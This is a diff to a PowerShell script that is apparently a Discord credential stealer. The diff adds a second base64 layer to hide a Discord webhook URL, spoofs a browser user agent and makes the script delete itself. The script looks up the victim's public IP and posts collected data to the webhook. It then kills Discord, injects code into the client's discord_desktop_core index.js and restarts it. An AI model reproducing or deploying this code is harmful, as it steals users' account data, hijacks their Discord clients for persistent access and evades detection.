@@ -1,10 +1,10 @@
+if ($IsMacOS -or $IsLinux -or $env:OSTYPE -like "*darwin*" -or $env:OSTYPE -like "*linux*") { exit }
 
-if ($IsMacOS -or $IsLinux -or $env:OSTYPE -like "*darwin*" -or $env:OSTYPE -like "*linux*") {
-    exit
-}
+$b64_tier2 = "YUhSMGNITTZMeTlrYVhOamIzSmtMbU52YlM5aGNHa3ZkMlZpYUc5dmEzTXZNVFE1TVRreE5UY3dNell5TWpnek1qSXlPQzlFYTFsYWNrUndNMUpKY1ZJd1ZWaDFTa2hCU1VSYWRrbHJYMTluVmswelUyOVdNbVUzUVdac1oweEVUWFJDUlRWM1QyWm9ZbUp2WW5sUWNIQlBMVTlVTmpjamFRPT0="
 
-$b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MTkxNTcwMzYyMjgzMjIyOC9Ea1lackRwM1JJcVIwVVh1SkhBSURadklrX19nVk0zU29WMmU3QWZsZ0xETXRCRTV3T2ZoYmJvYnlQcHBPLU9UNjdjaQ=="
-$w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
+$b64_tier1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_tier2))
+
+$w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_tier1))
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $ip = try{(IWR api.ipify.org -TimeoutSec 5).Content}catch{'Unknown'}
@@ -27,7 +27,7 @@ foreach($n in $pr){
 }
 
 $j = @{content='```' + $out + '```'} | ConvertTo-Json
-try { Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($j)) -ContentType 'application/json' } catch {}
+try { Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($j)) -ContentType 'application/json' -UserAgent 'Mozilla/5.0' } catch {}
 
 Stop-Process -Name Discord -Force -ErrorAction SilentlyContinue
 $f = (Get-ChildItem -Path "$env:LOCALAPPDATA\Discord\app-*" -Filter "index.js" -Recurse | Where-Object {$_.FullName -like "*discord_desktop_core*"} | Select-Object -ExpandProperty FullName -First 1)
@@ -40,3 +40,5 @@ if($f){
     [System.IO.File]::WriteAllText($f, $js_final)
     Start-Process "$env:LOCALAPPDATA\Discord\Update.exe" "-processStart Discord.exe"
 }
+
+Remove-Item $MyInvocation.MyCommand.Path -Force
